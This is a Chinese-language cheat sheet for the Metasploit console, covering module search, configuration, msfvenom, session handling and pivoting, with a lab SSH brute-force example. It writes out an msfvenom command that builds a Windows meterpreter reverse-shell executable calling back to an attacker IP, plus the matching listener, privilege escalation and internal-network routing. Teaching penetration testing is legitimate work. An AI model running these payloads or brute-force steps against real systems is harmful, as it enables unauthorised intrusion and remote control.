# Metasploit Framework (msfconsole)

> 模块化渗透测试框架与交互式控制台，集模块搜索、漏洞利用、后渗透于一体
> 项目地址: https://github.com/rapid7/metasploit-framework

---

## 概述

Metasploit 的核心是 `msfconsole` 交互式控制台。所有功能围绕**模块**展开，标准流程四步：`search` 找模块 → `use` 载入 → `set` 配置 → `run` 执行。

模块类型：

| 类型 | 作用 |
|------|------|
| `exploit` | 漏洞利用，向目标发起攻击 |
| `auxiliary` | 辅助功能：扫描、爆破、探测等（`scanner/*` 是其子类） |
| `payload` | 利用成功后执行的代码（shell、meterpreter 等） |
| `post` | 后渗透模块，拿到会话后在目标主机上执行 |
| `encoder` | 载荷编码，用于免杀或绕过限制 |
| `evasion` | 绕过 AV 检测 |
| `nop` | NOP 指令生成器 |

---

## 启动

```bash
msfconsole
# 显示 banner 后进入 msf6 > 提示符
```

常用控制台命令：

| 命令 | 作用 |
|------|------|
| `help` | 查看帮助 |
| `search` | 搜索模块（重点，见下） |
| `use <模块或编号>` | 载入模块 |
| `back` | 退出当前模块 |
| `show options` | 查看当前模块选项 |
| `save` | 保存当前设置 |
| `exit` | 退出 msfconsole |

---

## search 命令 — 模块搜索

使用 Metasploit 的第一步是在数千个模块中定位目标模块。语法：

```
search <关键词>
search <字段>:<值> [逻辑连接词 <字段>:<值>]
```

### 搜索字段（缩小范围的核心）

| 字段 | 匹配内容 | 示例 |
|------|----------|------|
| `name:` | 模块名称 | `search name:sshd` |
| `type:` | 模块类型 | `search type:exploit` |
| `platform:` | 目标平台 | `search platform:windows` |
| `arch:` | 目标架构 | `search arch:x64` |
| `port:` | 目标端口 | `search port:445` |
| `cve:` | CVE 编号 | `search cve:2017-0144` |
| `edb:` | Exploit-DB 编号 | `search edb:42031` |
| `rank:` | 模块质量等级 | `search rank:great` |
| `path:` | 模块路径 | `search path:scanner/ssh` |
| `author:` | 模块作者 | `search author:hdm` |
| `check:` | 是否支持 check 命令 | `search check:true` |
| `min_date:` / `max_date:` | 披露时间范围 | `search max_date:2017-01-01` |

直接输入普通关键词时，模糊匹配模块的**名称和描述**，例如 `search ssh_login`、`search eternalblue`。

### 逻辑组合

用 `and`、`or`、`not`（等价符号 `&&`、`||`、`!`）连接多个条件，支持括号分组：

```
search cve:2017-0144 and platform:windows
search name:tomcat and platform:java
search type:exploit and port:445 and not name:smb
search (platform:linux or platform:unix) and rank:excellent
```

多个条件不加连接词时默认是 `and`：

```
search type:exploit platform:windows cve:2017
# 等价于 type:exploit AND platform:windows AND cve:2017
```

### 按质量等级筛选

`rank:` 按模块可靠性从高到低：`excellent > great > good > normal > average > low > manual`

```
# 只找质量好的 Linux 后渗透提权模块
search type:post platform:linux rank:good
```

### 常用缩小范围套路

| 场景 | 命令 |
|------|------|
| 已知 CVE | `search cve:2021-44228` |
| 已知 Exploit-DB 编号 | `search edb:42031` |
| 只找某类型 | `search type:exploit` / `search type:auxiliary` |
| 限定平台 | `search platform:php` / `search platform:java` |
| 按端口 | `search port:3306` |
| 组合定位 | `search type:exploit platform:windows cve:2017` |
| 结果太多时继续收窄 | 追加字段，如 `search cve:2021-44228 type:exploit` |
| 无结果时放宽 | 去掉一个条件，或把字段前缀换成裸关键词 |

**为什么搜不到：** 裸关键词只匹配模块名称和描述，而 `cve:`、`name:` 等字段前缀才匹配对应元数据。搜不到时依次尝试：确认拼写 → 换字段前缀 → 删条件逐步放宽。

### 对结果二次过滤 `-S`

`-S` 参数用正则表达式对**已搜出的结果**再做一次过滤，适合在大结果集中快速定位：

```
search platform:windows -S eternalblue
search type:exploit -S "jboss|tomcat"
```

### search 选项

| 参数 | 作用 |
|------|------|
| `-h` | 显示搜索帮助（含全部可用字段） |
| `-S <正则>` | 对搜索结果二次过滤 |
| `-o <文件>` | 结果导出为 CSV |
| `-s <列>` | 按指定列排序 |
| `-r` | 倒序排序 |

### 用编号直接载入

搜索结果第一列是编号，可直接 `use`：

```
msf6 > search ssh_login
#   0  auxiliary/scanner/ssh/ssh_login           ...
#   1  auxiliary/scanner/ssh/ssh_login_pubkey    ...
msf6 > use 0
msf6 auxiliary(scanner/ssh/ssh_login) >
```

---

## searchsploit — Exploit-DB 本地搜索（独立工具）

> `searchsploit` 是 Kali 中 `exploitdb` 包自带的独立命令行工具，**不是 Metasploit 的一部分**，也不在 msfconsole 里。它搜索本地克隆的 Exploit-DB 漏洞库（`/usr/share/exploitdb/`），用于在发起攻击前查找现成的 exploit 脚本。

与 `search edb:` 的区别：msfconsole 的 `search` 只搜索 Metasploit **自己的模块库**，`edb:` 字段匹配的是模块元数据里引用的 EDB 编号；`searchsploit` 覆盖整个 Exploit-DB 数据库，包含大量**非 Metasploit** 的 PoC / 脚本（C、Python、Ruby 等），两者互补。

```bash
searchsploit eternalblue             # 关键词搜索
searchsploit windows remote smb      # 多关键词 AND 搜索
searchsploit -p 42315                # 显示该漏洞的本地文件路径
searchsploit -m 42315                # 镜像复制到当前目录
searchsploit --update                # 用 git 同步更新本地库
```

---

## use 与 info — 载入与查看模块

```
use 0                                       # 用搜索结果编号载入
use auxiliary/scanner/ssh/ssh_login         # 或用完整路径
info                                        # 查看模块信息
info -d                                     # 查看完整文档
```

`info` 输出包括：模块说明、必填选项、参考链接（CVE/EDB）。**执行前先看必填选项，避免 run 时报错。**

---

## set 与 options — 配置参数

进入模块后配置参数：

```
set rhost 192.168.230.181       # 设置单个选项
set user_file /path/file.txt
setg rhost 192.168.230.181      # 全局设置，切换模块后保留
unset rhost                     # 取消单个设置
unset all                       # 清空所有选项
get rhost                       # 查看单个选项值
show options                    # 查看所有选项（Required 列标 yes 的为必填）
show advanced                   # 查看高级选项
show payloads                   # 查看该模块可用 payload
show targets                    # 查看该模块支持的目标系统
```

**必填但为空的选项会在 run 时直接报错**。如 SSH 爆破中字典路径无效时的报错：

```
[-] Msf::OptionValidateError One or more options failed to validate: USER_FILE.
```

---

## run / exploit — 执行

```
run          # 执行模块（auxiliary 模块用 run）
exploit      # 执行 exploit 模块（对 auxiliary 也等价）
check        # 部分 exploit 支持：先检测目标是否可利用，不实际攻击
```

扫描/爆破类模块执行中可用 `Ctrl+C` 中断，已 set 的选项保留，再次 `run` 即可继续。

---

## msfvenom — 生成载荷/木马（独立二进制）

> `msfvenom` 是 Metasploit 套件的**独立程序**（不是 msfconsole 内命令），用于生成独立的 payload 文件（reverse shell 木马等）。因为不参与 `search → use → set → run` 的交互流程，所以在控制台外执行。

```bash
# 生成 Windows x64 的 meterpreter 反弹木马
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o shell.exe

msfvenom --list payloads      # 列出全部可用 payload
```

生成后需在 msfconsole 里用 `handler` 监听，payload 参数必须与生成时完全一致：

```
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost 10.10.14.5
set lport 4444
run -j                        # 后台运行监听
```

**staged 与 stageless：** staged 载荷（路径为 `.../meterpreter/reverse_tcp`）先回传一小段 stager，再由 stager 二次回连下载完整 payload，文件体积小；stageless（下划线写法 `.../meterpreter_reverse_tcp`）把完整 payload 直接打进文件，体积大但无需第二次回连。按目标环境（杀软、文件大小限制）选择。

---

## sessions — 会话管理与会话派生

利用成功后建立会话，之后的操作都在会话内完成：

```
sessions -l          # 列出所有会话
sessions -i 1        # 进入会话 1
sessions -k 1        # 杀掉会话 1
```

### 会话内常用操作（meterpreter）

进入会话后，`meterpreter >` 提示符下：

```
background      # 退回 msfconsole 并保留会话（等价 Ctrl+Z）
shell           # 进入目标系统命令 shell
getsystem       # 尝试提权到 SYSTEM
run post/multi/recon/local_exploit_suggester   # 收集本地提权线索
exit            # 结束会话
```

### 后台任务与监听（派生新会话）

在 msfconsole 顶层：

```
exploit -j                  # 把 exploit 作为后台任务运行，不占用控制台
jobs -l                     # 查看后台任务
use exploit/multi/handler   # 建立监听，接收后续反弹的 shell
```

### 横向路由（借已有会话访问内网）

拿到会话后可用 `route` 把它变成跳板，访问目标内网其他网段：

```
route add 172.16.5.0 255.255.255.0 1   # 通过会话 1 访问 172.16.5.0/24
route print                             # 查看路由表
run post/multi/manage/autoroute         # 自动添加路由
```

之后 msfconsole 里的扫描/利用模块就会经由该会话转发，无需直连内网。会话相关命令的完整选项因版本略有差异，使用前先 `sessions -h` 查看。

---

## 完整流程示例

以 Metasploitable2 的 SSH 弱口令爆破为例（详细分析见 [[OpenSSH-4.7p1-弱口令与提权]]）：

```
msf6 > search ssh_login
msf6 > use 0
msf6 auxiliary(scanner/ssh/ssh_login) > set rhost 192.168.230.181
msf6 auxiliary(scanner/ssh/ssh_login) > set user_file /home/kali/桌面/share/username.txt
msf6 auxiliary(scanner/ssh/ssh_login) > set pass_file /home/kali/桌面/share/passwd.txt
msf6 auxiliary(scanner/ssh/ssh_login) > run
[+] 192.168.230.181:22 - Success: 'msfadmin:msfadmin'
[*] SSH session 1 opened
```

标准流程：`search` → `use` → `info` → `set` → `run` → `sessions`。

---

## 注意事项

- **先 search 再 use**：不要凭记忆拼模块路径，搜索结果可直接用编号 `use`
- **必填选项要看全**：`show options` 中 Required 列标 yes 的必须设置
- **search 无结果时**：裸关键词只匹配名称/描述，改用字段前缀（`cve:`、`name:`、`type:`）或逐步放宽条件
- **数据库集成**：`db_nmap`、`hosts`、`vulns` 等命令可将扫描与漏洞信息存入本地数据库，跨模块复用
- **授权边界**：所有扫描、爆破、利用操作仅应在明确授权范围内进行
